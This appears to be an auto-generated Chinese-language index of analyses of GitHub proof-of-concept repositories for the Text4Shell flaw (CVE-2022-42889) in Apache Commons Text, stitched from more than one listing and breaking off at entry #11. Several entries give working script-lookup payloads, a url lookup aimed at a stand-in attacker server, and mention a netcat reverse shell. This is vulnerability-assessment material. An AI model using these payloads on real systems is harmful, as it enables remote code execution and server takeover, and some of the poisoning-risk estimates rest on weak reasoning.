根据漏洞描述和搜索结果，提供的POC代码（尤其是 `src/main/java/org/dontpanic/text4shell/controller/ExploitMeController.java` 文件）旨在演示此漏洞。`ExploitMeController` 中的 `/lookup` 端点接收用户提供的 `value`，并将其直接传递给 `StringSubstitutor.replace()` 方法，而没有进行任何清理或验证。这允许攻击者注入恶意表达式，例如`${script:javascript:Runtime.getRuntime().exec("command")}`，从而导致远程代码执行。

**投毒风险：**
提供的代码主要是漏洞利用的演示，旨在重现和展示 CVE-2022-42889。虽然代码本身并没有明显的恶意或后门性质，但存在一些小的风险。由于整个仓库的目的就是为了演示漏洞，如果有人下载并部署了这个应用，并将其暴露在公网上，那么它会立即成为攻击目标。因此，可以认为存在很低的投毒风险 (约5%)，因为作者可能故意提供一个容易被利用的环境，但不是传统意义上的“投毒”，而是漏洞演示的副产品。

**利用方式：**
1.  **目标系统：** 目标系统需要运行使用了 Apache Commons Text 1.5 到 1.9 版本的应用程序。
2.  **输入注入：** 攻击者需要找到一个应用程序接口，该接口允许用户提供输入，然后应用程序使用受影响的 Apache Commons Text 版本对该输入进行插值处理。例如，在提供的 POC 中，`/lookup` 端点就是一个这样的接口。
3.  **构造恶意Payload：**  攻击者需要构造一个包含恶意表达式的Payload，该表达式利用了 `script`, `dns`, 或 `url` lookup 来执行代码或进行其他恶意操作。示例Payload：
    *   `${script:javascript:Runtime.getRuntime().exec('touch /tmp/pwned')}` - 执行任意命令 (例如，创建一个文件)。
    *   `${dns:address|example.com}` - 执行 DNS 查询。
    *   `${url:UTF-8:https://example.com/evil.txt}` - 从远程 URL 加载内容。
4.  **发送Payload：**  攻击者将构造的Payload发送到目标应用程序的易受攻击的接口。
5.  **代码执行：**  如果应用程序使用 `StringSubstitutor` 处理Payload，它将执行Payload中的恶意表达式，从而导致远程代码执行或其它恶意行为。


**项目地址:** [hotblac/text4shell](https://github.com/hotblac/text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #20

**来源**: [CVE-2022-42889-joshbnewton31080_cve-2022-42889-text4shell.md](../2022/CVE-2022-42889-joshbnewton31080_cve-2022-42889-text4shell.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许远程代码执行

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响的Apache Commons Text版本，并且允许用户控制的输入传递给StringSubstitutor.replace()方法

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-42889，也被称为Text4Shell，是Apache Commons Text库中的一个远程代码执行漏洞。该漏洞源于库中使用的字符串插值功能，攻击者可以通过构造包含恶意脚本的输入，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`，来执行任意代码。提供的POC代码通过创建一个简单的Spring Boot应用程序，演示了如何利用该漏洞。`HelloController.java`文件中的`attack`方法使用`StringSubstitutor.createInterpolator()`创建插值器，并使用`interpolator.replace(search)`来替换用户提供的输入。如果应用程序使用Commons Text 1.5到1.9版本，并且允许用户控制的输入传递给`replace()`方法，则攻击者可以利用此漏洞执行任意代码。

**有效性：**

根据提供的漏洞库信息、搜索引擎结果和POC代码，可以判断该漏洞利用是有效的。POC代码展示了利用`script`前缀执行`touch`命令的例子。搜索引擎结果也确认了该漏洞的存在以及利用方式。

**投毒风险：**

审查提供的文件，Dockerfile文件用于构建Docker镜像，pom.xml是Maven的配置文件，用于管理项目依赖和构建过程，src/main/java包含了应用程序的源代码，src/test/java 包含了测试代码。这些文件本身不包含明显的恶意代码，因此可以判断投毒风险较低。pom.xml 中指定的 commons-text 版本是1.8， 属于漏洞版本。 Dockerfile文件也没问题。

**利用方式：**

1.  应用程序使用Apache Commons Text 1.5到1.9版本。
2.  应用程序允许用户控制的输入传递给`StringSubstitutor.replace()`方法。
3.  攻击者构造包含恶意脚本的输入，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`，其中`command`是要执行的任意命令。
4.  应用程序使用`StringSubstitutor.replace()`方法替换输入，触发漏洞，执行恶意代码。

**项目地址:** [joshbnewton31080/cve-2022-42889-text4shell](https://github.com/joshbnewton31080/cve-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #21

**来源**: [CVE-2022-42889-karthikuj_cve-2022-42889-text4shell-docker.md](../2022/CVE-2022-42889-karthikuj_cve-2022-42889-text4shell-docker.md)

# CVE-2022-42889

> 📦 该CVE有 **27** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-42889-34006133_CVE-2022-42889.md](../2022/CVE-2022-42889-34006133_CVE-2022-42889.md)

## CVE-2022-42889 Text4Shell RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text，并且允许用户可控的输入传递给执行插值的函数。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-42889 (Text4Shell) 是一个 Apache Commons Text 库中的远程代码执行漏洞。该漏洞源于库中存在变量插值功能，允许动态评估和扩展属性。在 1.5 到 1.9 版本中，默认的 Lookup 实例包含一些插值器，例如 "script", "dns", 和 "url"，这些插值器可能导致任意代码执行或与远程服务器通信。如果应用程序使用这些默认插值器并且允许用户可控的输入进行插值，那么攻击者可以通过构造包含恶意表达式的输入，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`，来执行任意代码。提供的漏洞利用代码 `main.go` 尝试构造一个包含恶意payload的URL，该URL包含一个 `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}` 形式的payload, 并通过HTTP GET请求发送到目标服务器。`possiblepoc.go` 文件似乎尝试创建一个反向shell。 根据代码分析,未发现作者隐藏的恶意投毒代码。利用方式：1. 确定目标应用程序正在使用受影响版本的 Apache Commons Text 并且暴露了允许用户输入进行插值的接口。2. 构造包含恶意表达式的输入，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`。3. 将构造的输入发送到目标应用程序，触发漏洞并执行任意代码。

**项目地址:** [34006133/CVE-2022-42889](https://github.com/34006133/CVE-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #2

**来源**: [CVE-2022-42889-808ale_CVE-2022-42889-Text4Shell-POC.md](../2022/CVE-2022-42889-808ale_CVE-2022-42889-Text4Shell-POC.md)

## CVE-2022-42889-Apache Commons Text-RCE/SSRF

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE) / 服务器端请求伪造 (SSRF)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致远程代码执行或服务器端请求伪造

**影响版本:** < 1.10.0 (1.5 <= version <= 1.9)

**利用条件:** 应用程序使用受影响的Apache Commons Text版本，并且允许用户可控输入被用于文本插值。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，也被称为Text4Shell，是Apache Commons Text 1.5到1.9版本中的一个严重漏洞。该漏洞允许攻击者通过构造包含恶意表达式的字符串，利用文本插值功能执行任意代码（RCE）或发起服务器端请求伪造（SSRF）攻击。

**有效性分析：**

提供的POC代码是一个Python脚本，旨在测试目标系统是否存在Text4Shell漏洞。该脚本支持两种模式：

*   **RCE模式：** 利用`script`前缀，尝试执行JavaScript命令。具体而言，它使用Nashorn引擎（在Java 15及更高版本中默认禁用）来执行操作系统命令。如果目标系统启用了Nashorn引擎，则可能成功执行RCE攻击。
*   **SSRF模式：** 利用`url`前缀，尝试从指定的URL获取内容。这可能导致服务器向攻击者控制的服务器发出请求，从而泄露敏感信息或进行其他攻击。

根据NVD信息和搜索引擎结果，该漏洞影响Apache Commons Text 1.5到1.9版本，利用的关键在于应用程序是否接受用户可控的输入并将其传递给`StringSubstitutor.replace()`等插值方法。

因此，该POC代码在特定条件下是有效的。如果目标系统使用了受影响的Apache Commons Text版本，并且允许用户输入参与文本插值，那么攻击者就可以利用该漏洞。

**投毒风险分析：**

对提供的POC代码进行分析，可以发现其中存在轻微的投毒风险。虽然脚本本身的功能是测试漏洞，但如果攻击者修改脚本，例如：

*   **修改RCE命令：** 将测试命令替换为恶意命令，例如下载并执行恶意程序。
*   **修改SSRF URL：** 将SSRF目标URL替换为指向包含恶意内容的URL，例如包含恶意JavaScript代码的页面。
*   **增加额外功能** 添加未经授权的信息收集功能。

这些修改可能会导致用户在不知情的情况下受到攻击。

因此，评估的投毒风险为5%。主要集中在使用人员的安全意识上，是否存在下载后未进行代码审核直接执行的情况。

**利用方式：**

1.  **确定目标系统使用的Apache Commons Text版本是否在受影响范围内 (1.5-1.9)。**
2.  **找到应用程序中接受用户输入并使用Apache Commons Text进行文本插值的位置。**
3.  **构造包含恶意表达式的字符串，例如：**
    *   `${script:javascript:java.lang.Runtime.getRuntime().exec('malicious_command')}` (RCE，需要Nashorn引擎支持)
    *   `${url:UTF-8:http://attacker_controlled_server/resource}` (SSRF)
4.  **将构造的恶意字符串作为用户输入传递给应用程序。**
5.  **如果漏洞利用成功，攻击者将能够执行任意代码或发起SSRF攻击。**

**项目地址:** [808ale/CVE-2022-42889-Text4Shell-POC](https://github.com/808ale/CVE-2022-42889-Text4Shell-POC)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #3

**来源**: [CVE-2022-42889-Dima2021_cve-2022-42889-text4shell.md](../2022/CVE-2022-42889-Dima2021_cve-2022-42889-text4shell.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行（RCE）

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用了受影响版本的 Apache Commons Text，并且允许用户控制输入，该输入会被用于字符串插值。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-42889，也被称为Text4Shell，是一个影响Apache Commons Text库的远程代码执行漏洞。该漏洞源于Apache Commons Text在1.5到1.9版本中，默认启用了一些不安全的StringLookup实现，如`script`，`dns`和`url`。当应用程序使用这些默认的Lookup实例并且允许用户控制输入时，攻击者可以通过构造恶意的字符串，利用变量插值功能执行任意代码。

**有效性分析：**

提供的POC代码是一个Spring Boot应用程序，它使用Apache Commons Text库进行字符串插值。`HelloController.java`文件中的`attack`方法接收一个名为`search`的请求参数，并使用`StringSubstitutor.createInterpolator()`创建一个插值器，然后使用`interpolator.replace(search)`方法对`search`参数进行插值。这意味着攻击者可以通过`search`参数传递恶意的字符串，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`，来执行任意代码。`pom.xml`文件显示该项目使用了Apache Commons Text 1.8版本，属于受影响的版本范围。`README.md`文件提供了构建、运行和测试该POC应用程序的步骤，并提供了一个示例攻击payload。

根据漏洞信息和POC代码分析，该POC代码是有效的，可以用于演示和验证CVE-2022-42889漏洞。

**投毒风险分析：**

分析提供的代码，没有发现明显的投毒代码。该仓库的主要目的是为了演示CVE-2022-42889漏洞，代码结构清晰，功能单一，主要就是接收输入并利用commons-text进行解析。

**利用方式：**

1.  攻击者首先需要找到一个应用程序，该应用程序使用了受影响版本的Apache Commons Text库（1.5到1.9）。
2.  攻击者需要找到一个允许用户控制输入的地方，该输入会被传递给`StringSubstitutor.replace()`方法进行插值。
3.  攻击者构造一个包含恶意payload的字符串，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`，其中`command`是要执行的任意命令。
4.  攻击者将构造的恶意字符串作为输入传递给应用程序。
5.  应用程序使用`StringSubstitutor.replace()`方法对输入进行插值，从而执行攻击者指定的命令。

利用`dns`，攻击者可以构造payload让服务器解析恶意域名，从而进行信息收集或发起其他攻击。利用`url`，攻击者可以让服务器请求恶意URL，从而可能导致SSRF（服务器端请求伪造）漏洞。

**修复建议：**

升级到Apache Commons Text 1.10.0或更高版本。新版本默认禁用了`script`，`dns`和`url`等不安全的StringLookup实现。如果必须使用这些Lookup，请确保只在可信的环境中使用。

**项目地址:** [Dima2021/cve-2022-42889-text4shell](https://github.com/Dima2021/cve-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #4

**来源**: [CVE-2022-42889-DimaMend_cve-2022-42889-text4shell.md](../2022/CVE-2022-42889-DimaMend_cve-2022-42889-text4shell.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 1.9

**利用条件:** 应用使用了受影响版本的Apache Commons Text，并且允许用户可控的字符串参与到`${}`表达式的解析过程中

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-42889，也被称为 Text4Shell，是 Apache Commons Text 1.5 到 1.9 版本中的一个远程代码执行漏洞。该漏洞源于库中使用的字符串插值功能。当应用程序使用这些版本的 Commons Text，并且将用户提供的、未经充分清理的数据传递给 StringSubstitutor.replace() 方法时，攻击者可以利用`${prefix:name}`格式的字符串注入恶意代码。

**有效性：**

提供的PoC 代码有效，它演示了如何利用该漏洞执行任意命令。PoC 代码包含了一个 Spring Boot 应用程序，该程序接受一个名为 `search` 的请求参数，并使用 `StringSubstitutor.replace()` 方法对其进行插值。通过构造包含`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}` 的恶意 payload，攻击者可以在服务器上执行任意命令。

**投毒风险：**

该仓库中作者隐藏的投毒代码可能性极低。`Dockerfile`、`pom.xml`和java源代码没有发现任何恶意行为。虽然存在远程代码执行漏洞，但这本身不是投毒。1%的风险在于构建脚本可能依赖于外部资源（例如，Maven仓库），这些资源可能在构建时被篡改，或者受到供应链攻击。但是，就提供的代码本身而言，它似乎没有包含故意的恶意代码。

**利用方式：**

1.  攻击者需要找到一个应用程序，该程序使用了存在漏洞的 Apache Commons Text 版本（<= 1.9）。
2.  攻击者需要在该应用程序中找到一个输入点（例如，HTTP 请求参数、表单字段等），该输入点允许攻击者控制将传递给 `StringSubstitutor.replace()` 方法的字符串。
3.  攻击者构造包含恶意`${prefix:name}` 表达式的 payload。`prefix` 可以是 `script`、`dns` 或 `url`。例如，可以使用 `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}` 执行任意命令，使用 `${dns:address}` 解析恶意域名，或使用 `${url:UTF-8:url}` 从远程服务器加载数据。
4.  攻击者将 payload 传递给应用程序。
5.  应用程序使用 `StringSubstitutor.replace()` 方法处理 payload，导致恶意代码被执行。

**项目地址:** [DimaMend/cve-2022-42889-text4shell](https://github.com/DimaMend/cve-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #5

**来源**: [CVE-2022-42889-Gotcha1G_CVE-2022-42889.md](../2022/CVE-2022-42889-Gotcha1G_CVE-2022-42889.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 1.9

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，且允许用户可控的输入传递给文本插值功能

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个远程代码执行漏洞。该漏洞源于库中不安全的默认文本插值配置，允许攻击者通过构造包含恶意表达式的输入，利用`script`, `dns`, 或 `url` 等lookup执行任意代码或与远程服务器通信。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的PoC代码，此漏洞的利用是有效的。搜索引擎结果中的多个条目都将此漏洞描述为高危远程代码执行漏洞，并提供了利用示例。

**投毒风险：**
提供的PoC代码本身旨在验证漏洞的存在，通过`curl+{{interactsh-url}}`的方式来检测是否成功执行了命令。由于该PoC代码目的在于触发漏洞并进行验证，不包含恶意行为（例如：上传恶意文件、修改系统配置等），因此其主要风险在于被滥用进行攻击。但仓库中其他未提供的文件，可能存在隐藏的后门或恶意代码，因此综合判定存在10%的投毒风险。

**利用方式：**
攻击者将构造包含恶意表达式的字符串，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`。这个字符串会被传递给使用了Apache Commons Text库进行文本插值的应用程序。如果应用程序没有对用户输入进行充分的验证和过滤，该表达式将被解析并执行，导致远程代码执行。PoC中使用了`curl`命令和`interactsh`服务来验证漏洞是否成功利用，实际攻击中可以替换成任何其他命令。

简而言之，利用方式是：
1.  应用程序使用存在漏洞的Apache Commons Text版本（<= 1.9）。
2.  应用程序允许用户可控的输入传递给文本插值功能。
3.  攻击者构造包含恶意表达式的输入。
4.  Apache Commons Text解析并执行恶意表达式，导致RCE。

**项目地址:** [Gotcha1G/CVE-2022-42889](https://github.com/Gotcha1G/CVE-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #6

**来源**: [CVE-2022-42889-MendDemo-josh_cve-2022-42889-text4shell.md](../2022/CVE-2022-42889-MendDemo-josh_cve-2022-42889-text4shell.md)

## CVE-2022-42889 Text4Shell

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用了受影响版本的Apache Commons Text，并且允许用户可控的字符串传递给`StringSubstitutor.replace()`方法。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个漏洞。该漏洞源于库中使用的字符串插值功能，攻击者可以通过构造包含恶意表达式的字符串，利用`script`, `dns` 或 `url` 等前缀，触发远程代码执行。该漏洞利用的有效性较高，因为提供的POC代码直接演示了如何使用`script`前缀执行`touch /tmp/foo`命令。Docker文件和README文件提供了构建和运行包含漏洞的应用程序的详细说明。尽管POC展示了RCE，但是仍然需要确认是否存在投毒风险，通过阅读所有提供的文件，没有发现任何隐藏的后门代码或其他恶意行为。Dockerfile文件用于构建包含漏洞应用程序的Docker镜像，pom.xml指定了所使用的commons-text版本为1.8，处于漏洞影响范围内。java代码也用于漏洞的验证。`HelloController.java` 暴露了一个 `/text4shell/attack` 的API接口，接收一个名为 `search` 的参数，并使用 `StringSubstitutor.replace()` 方法对其进行处理，从而导致漏洞。风险主要在于，这个demo程序是否会被滥用，作者是否会把这个程序用于攻击等等。 经过评估,作者投毒的可能性较小，但是仍然有一定的潜在风险，大约为10%。

**利用方式：**
1.  攻击者将特制的字符串（包含`${prefix:payload}`格式的恶意表达式）作为输入，传递给使用了`StringSubstitutor.replace()`方法的应用程序。
2.  `StringSubstitutor`会对字符串进行插值，如果`prefix`是`script`，`dns`或者`url`，则会调用相应的lookup来解析`payload`。
3.  `script`前缀允许执行任意的Java代码，`dns`前缀允许进行DNS查询，`url`前缀允许从URL加载内容，恶意构造的`payload`可以导致RCE或SSRF攻击。

**项目地址:** [MendDemo-josh/cve-2022-42889-text4shell](https://github.com/MendDemo-josh/cve-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #7

**来源**: [CVE-2022-42889-QAInsights_cve-2022-42889-jmeter.md](../2022/CVE-2022-42889-QAInsights_cve-2022-42889-jmeter.md)

## CVE-2022-42889: Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text，并且允许用户可控的字符串进行变量插值。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-42889 漏洞是 Apache Commons Text 库中一个远程代码执行漏洞，存在于 1.5 到 1.9 版本中。该漏洞源于库中存在不安全的默认变量插值配置，允许攻击者通过 `${prefix:name}` 格式的字符串执行任意代码或与远程服务器交互。其中，`prefix` 用于定位执行插值的 `org.apache.commons.text.lookup.StringLookup` 实例。存在风险的 `prefix` 包括 `script` (执行 JVM 脚本), `dns` (解析 DNS 记录), 和 `url` (从 URL 加载值)。

**有效性：**
根据漏洞描述、搜索结果和漏洞利用方式，该漏洞利用是有效的。搜索结果中多个链接表明该漏洞（又名 Text4Shell）是一个严重的安全问题，允许远程代码执行。

**投毒风险：**
提供的代码片段是 Apache License 的许可证文本，不包含任何可执行代码，因此不存在投毒风险。投毒风险评估为 0%。

**利用方式：**
1.  应用程序使用 Apache Commons Text 1.5 到 1.9 版本。
2.  应用程序接受用户提供的字符串，并使用该字符串进行变量插值，没有进行充分的过滤或安全处理。
3.  攻击者构造包含恶意 `prefix` 的字符串，例如 `${script:javascript code}` 或 `${url:http://malicious-server/evil.txt}`。
4.  Apache Commons Text 解析该字符串，并执行相应的操作，例如执行 JavaScript 代码或从恶意 URL 加载内容，从而导致远程代码执行或信息泄露。

**项目地址:** [QAInsights/cve-2022-42889-jmeter](https://github.com/QAInsights/cve-2022-42889-jmeter)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #8

**来源**: [CVE-2022-42889-ReachabilityOrg_cve-2022-42889-text4shell-docker.md](../2022/CVE-2022-42889-ReachabilityOrg_cve-2022-42889-text4shell-docker.md)

## CVE-2022-42889 - Apache Commons Text RCE (Text4Shell)

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 1.9, >= 1.5

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，并且允许用户控制用于变量插值的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，又名Text4Shell，是一个存在于Apache Commons Text库中的远程代码执行漏洞。受影响的版本（1.5 到 1.9）中的默认插值器允许通过 `script`, `dns`, `url` 等前缀执行任意代码或与远程服务器建立连接。

**有效性：**

提供的POC代码是有效的，它展示了如何利用该漏洞。Dockerfile和pom.xml文件显示使用了易受攻击的Apache Commons Text 1.8版本。`README.md`文件提供了构建和运行POC应用程序的明确步骤，以及使用`${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`有效负载触发RCE的示例。它尝试在/tmp/目录下创建一个文件来验证漏洞。

**投毒风险：**

该代码仓库中存在一些轻微的投毒风险的可能性。`whitesource.config`文件表明使用了 Whitesource，这是一种软件组合分析（SCA）工具。虽然这本身不是恶意行为，但可能表明作者试图隐藏某些依赖项或漏洞，或者他们正在使用自动化工具进行构建。代码结构较为简单，且RCE payload 明显，但仍需要对整个仓库进行细致的代码审计以完全确定是否还有其它隐藏的恶意代码，故判投毒比例为10%。

**利用方式：**

该漏洞的利用方式是通过构造包含恶意表达式的字符串，利用Apache Commons Text的字符串插值功能。攻击者可以将恶意表达式注入到应用程序使用的任何用户可控的输入中（例如，URL参数，POST数据等）。当应用程序使用`StringSubstitutor.createInterpolator()`并使用用户提供的输入执行插值时，恶意表达式将被执行。提供的POC使用`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}` 形式的payload在目标机器上执行任意命令。其他的利用方式可以使用`dns`或`url`前缀来尝试联系恶意服务器或执行其他操作。

**项目地址:** [ReachabilityOrg/cve-2022-42889-text4shell-docker](https://github.com/ReachabilityOrg/cve-2022-42889-text4shell-docker)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #9

**来源**: [CVE-2022-42889-Sic4rio_CVE-2022-42889.md](../2022/CVE-2022-42889-Sic4rio_CVE-2022-42889.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响的 Apache Commons Text 版本，且允许用户可控的输入传递给 Commons Text 的文本插值功能。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889 (Text4Shell) 是 Apache Commons Text 库中的一个远程代码执行漏洞。该漏洞源于库中的变量插值功能，允许攻击者通过构造恶意输入，利用`script`, `dns`, 和 `url` 等 StringLookup 实现执行任意代码或与远程服务器进行交互。 

**有效性：**

根据漏洞信息、搜索结果和提供的POC代码，此漏洞利用是有效的。搜索结果中多个链接（例如：[webpage 1], [webpage 2], [webpage 4], [webpage 6], [webpage 9]）都表明此漏洞是远程代码执行漏洞，且危害严重。POC代码通过 `${script:javascript:java.lang.Runtime.getRuntime().exec(...) }` 构造恶意payload，利用 `script` StringLookup 执行系统命令，验证了漏洞的存在。

**投毒风险：**

提供的python POC代码主要功能是发送包含恶意payload的HTTP请求，payload会利用目标服务器上的java环境来执行命令。投毒代码分析如下：
*   代码的功能相对清晰，主要是构造payload发送请求，执行反弹shell。
*   风险点在于 `busybox nc` 命令，攻击者可能通过修改 IP 地址和端口来连接受害者的机器，但这是漏洞利用本身需要的，不能算是作者特意植入的后门。
*   虽然使用了`verify=False` 绕过了ssl证书校验，但这是为了方便测试自签名证书的情况，也属于正常情况。
*   代码中存在TerminalColors类，为输出添加颜色。这部分代码不会影响payload的执行，可以认为是正常的。

总体来看，代码本身并没有明显的恶意行为，但使用者需要注意，在未授权的情况下使用此脚本进行攻击属于非法行为。因此，投毒风险评估为5%。

**利用方式：**

1.  **确定目标：** 确定目标应用程序使用了存在漏洞的 Apache Commons Text 版本（1.5 到 1.9）。
2.  **构造Payload：**  构造包含恶意代码的字符串，利用`${prefix:name}` 格式进行变量插值。其中，`prefix` 可以是 `script`、`dns` 或 `url` 等，利用这些 StringLookup 实现执行命令或访问远程资源。
3.  **发送请求：**  将构造的恶意字符串作为输入，通过HTTP请求或其他方式发送给目标应用程序。该输入需要到达使用 Apache Commons Text 进行插值处理的地方。
4.  **执行代码：**  如果目标应用程序存在漏洞，Apache Commons Text 会解析恶意字符串，执行其中的代码。
5.  **反弹shell：**  POC中使用 `busybox nc` 命令反弹 shell，攻击者可以控制目标系统。

**项目地址:** [Sic4rio/CVE-2022-42889](https://github.com/Sic4rio/CVE-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #10

**来源**: [CVE-2022-42889-Syndicate27_text4shell-exploit.md](../2022/CVE-2022-42889-Syndicate27_text4shell-exploit.md)

## CVE-2022-42889 - Apache Commons Text 远程代码执行

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.10.0 (1.5 - 1.9)

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text，且允许用户可控的输入参与 `${}` 格式的字符串插值。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-42889，也被称为 Text4Shell，是一个影响 Apache Commons Text 1.5 到 1.9 版本的远程代码执行漏洞。该漏洞源于库中不安全的默认插值器，允许攻击者利用 'script'、'dns' 和 'url' 等前缀执行恶意代码。 

**有效性:**
根据漏洞库信息、搜索引擎结果和提供的 PoC 代码，此漏洞利用是有效的。PoC 代码展示了如何使用 `${script:javascript:java.lang.Runtime.getRuntime().exec(...)}` 构造恶意 payload，并通过 HTTP POST 请求发送到目标服务器，从而执行任意系统命令。

**投毒风险:**
分析 PoC 代码，未发现明显的投毒代码。该代码结构简单，主要功能是构造 payload 并发送 HTTP 请求。许可证和 README 文件也比较规范，没有可疑之处。因此，投毒风险评估为 0%。

**利用方式:**
1.  **确定目标应用:** 找到使用了存在漏洞的 Apache Commons Text 版本的 Java 应用程序，并且该应用允许用户控制的输入参与字符串插值。
2.  **构造 Payload:** 使用`${script:javascript:java.lang.Runtime.getRuntime().exec(...)}`或类似的方式构造恶意 payload，其中 `...` 部分包含要执行的系统命令，如反弹 shell 等。
3.  **URL 编码:** 对构造好的 payload 进行 URL 编码，以确保其能够正确地通过 HTTP 请求传输。
4.  **发送请求:**  将编码后的 payload 嵌入到 HTTP 请求的参数中（如 GET 请求的查询参数或 POST 请求的 body），发送到目标应用程序。
5.  **监听连接:**  如果 payload 是反弹 shell，需要在攻击者机器上监听相应的端口，等待目标机器连接。

**修复建议:**
升级到 Apache Commons Text 1.10.0 或更高版本，该版本默认禁用了有问题的插值器。如果无法升级，可以考虑禁用或限制应用程序中使用的插值器，或者对用户输入进行严格的验证和过滤。

**项目地址:** [Syndicate27/text4shell-exploit](https://github.com/Syndicate27/text4shell-exploit)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #11

**来源**: [CVE-2022-42889-aaronm-sysdig_text4shell-docker.md](../2022/CVE-2022-42889-aaronm-sysdig_text4shell-docker.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** <= 1.9

**利用条件:** 应用程序使用Apache Commons Text <= 1.9，且允许用户可控的字符串进行变量插值

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

